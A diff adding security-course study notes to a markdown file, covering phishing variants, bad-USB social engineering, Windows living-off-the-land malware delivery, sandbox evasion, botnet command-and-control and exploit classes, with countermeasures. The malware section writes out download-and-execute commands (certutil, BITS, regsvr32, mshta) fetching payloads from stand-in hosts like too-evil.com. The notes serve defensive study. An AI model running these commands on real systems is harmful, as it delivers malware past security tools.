@@ -52,6 +52,53 @@ other MITRE Techniques (supporting tactics)
 - Malware
 - Exploitation 
 
+### Credential Theft
+Various techniques, tactics and procedures to steal credentails. Big market for stolen credentials. 
+
+General countermeasures: Awareness training, password manager, 2 factor authentication (man-in-the-middle can usually bypass this though), conditional access control
+
+
+**Pishing**
+Phishing is the attempt to obtain sensitive information such as usernames, passwords, and credit card details, for malicious reasons, by disguising as a trustworthy entity in an electronic communication.
+Often via emails that forward you to a (malicous) site where user is to enter credentials.
+There are tools to test (and actually launcgh?) pishing campains, e.g.: https://getgophish.com  (not used in lab task)
+
+
+**Smishing**
+- pishing via SMS
+    - sms with link that refers user to a login page (pishing)
+    - sms with link to website that entices user to download malware (e.g. androin app that requires almost all rights)
+(SMS protocol has no security measures to verify sender)
+
+**Vishing**
+use phone calls to extract info 
+for example via voice over IP.
+https://voip.ms  -> calls via voice over IP (of course login is needed)
+
+**Leaked databases**
+If credentials are found in leaked database, the attackers often try the same credentials for other accounts (as users tend to use same pw for multiple accounts)
+
+
+**Varia related to credential theft**
+- SSL usually doesn't help against pishing as CA's are poor content watchdogs
+- Punycode: 
+    - codind to allow ASCI characters to display unicode characters
+    - Example: https://xn--80aa0cbo65f.com/ ->  https://раураӏ.com/  (depends on browser/app how it is displayed)
+
+
+### Social engineering
+Some notes:
+
+- bypass procedures 
+- Bad USB Attack
+    - just scatter some usb sticks (with malware etc.). Place them on desk etc..
+    - Most will be at some plugged in. And when user clicks on app (or even doc) it can 
+    - Some variants:
+        - Remote Keyboard that looks like a usb stick -> possible to control pc
+        - charger cable for cellphones containing webserver to allow remote access
+- Open source intelligence 
+    - check social media, google etc.
+- etc.
 
 ### Malware
 Malware is broad definition for software with harmul intent 
@@ -71,7 +118,7 @@ Malware is broad definition for software with harmul intent
 - adware
     - potentially unwanted (low risk)
 
-Malware is usually dealived via: 
+Malware is usually delivered via: 
 - E-Mail (most common)
 - Web (can be combined with email)
 - USB
@@ -79,6 +126,86 @@ Malware is usually dealived via:
 - exposed systems
 - supply chain attacks
 
+
+**Malware detonation (windows)**
+
+Windows has some tools which facilitate running malware:
+- CertUtil.exe  (tool to manage certificates)
+    - can download certificate (PEM) from url
+    - `certutil -urlcache -f <url> malicious1.txt` -> download
+    - `certutil -decode malicious1.txt malicious.gzip` decode
+- BitsTransfer (Service "Background Intelligent Transfer Service)
+    - Service to transfer data between server and client
+    - via powershell download file: `Start-BitsTransfer -Source http://bad-server.tld/payload.exe -Destination %APPDATA%/o.exe`
+- Msiexec (for msi)
+    - to run msi files
+    - Advantages: process is msiexec and considered legitimate, payload is in msi file and usually considered clean
+- regsvr32.exe (register dll's)
+    - File can be downloaded and executed. Example: `regsvr32 /u /s /i:https://too-evil.com/payload.php scrobj.dll`
+        - process would be regsvr32, which is usually considered legitimate
+- mshta.exe (tool to run hta scripts)
+    - HTA scripts are html like applications that can run outside the browsers
+    - example: `mshta http://too-evil.com/payload.php` (process will be mshta.exe which is considered legitimate)
+- schtasks (Windows task scheduler)
+    - Service "Task Scheduler"
+    - is not only used to run but also to persist malware
+
+
+**Sandbox evasion**
+Some (many) security solutions use sandboxing to detect malware. Some malware tries to detect sandboxes and (VM evasion/detection) and then behave differently (normal). Ways to detect malware could be: 
+- Guest additions (VMWare tools, Vbox Additions), drivers, system ressources, system temparature
+- no mouse/keyboard activity, no browser history, process, number of installed apps ...etc.
+
+Once a malware detects a virtualized environment, it changes it's behavior or exits.
+
+
+**Botnetz Communication**
+Infected machines ("bots") will ask botnet server (C&C) which tells bot what to do.
+Any protocol can be used (theoretically): HTTP/HTTPS, DNS, P2P, etc.
+Configuration of bot can be static or dynamic (meaning: is downloaded from C&C)
+
+
+Varia: 
+- Domain Generation Algorithm - DGA (see pdf)
+- FastFlux Network (see pdf)
+    - usually one or more Domain names for C&C servers
+- P2P Network (see pdf)
+    - Hierarchie for C&C servers (super-nodes)
+
+
+Countermeasures (reactiv or proactive)
+- riskmgm (proactive)
+- tooling (proactive)
+- awarness campain (proactive)
+- blocking (reactiv or proactive)
+- takedown (e.g. domain)
+    - e.g. tell provider
+- sinkholing
+    - direct traffic of C&C to a server to a) learn about botnet and b) prevent communication
+- ....
+
+### Exploitation (of vulnerabilities)
+Using existing apps (and there vulnerabilities) to introduce additional (malicious) code (remote code execution)
+
+Vulnerability classes
+- Memory Corruption
+− Injection Attacks
+− Deserialization issues
+    - deserialization often calls constructors (possibility to introduce code)
+    - also see web lab task with java
+− Information Disclosure
+− Misconfiguration
+
+Type of attacks
+- Local exploit
+    - escalate permissions
+- server-side exploit
+    - access webserver from remote (e.g. sql injection)
+- client exploit
+    - client accesses some "evil" machine/code/website (etc.) and due to a vulnerability remote code can be executed
+
+
+Tool: metasploit (see separate md file)
 
 ## Varia/leftovers
 
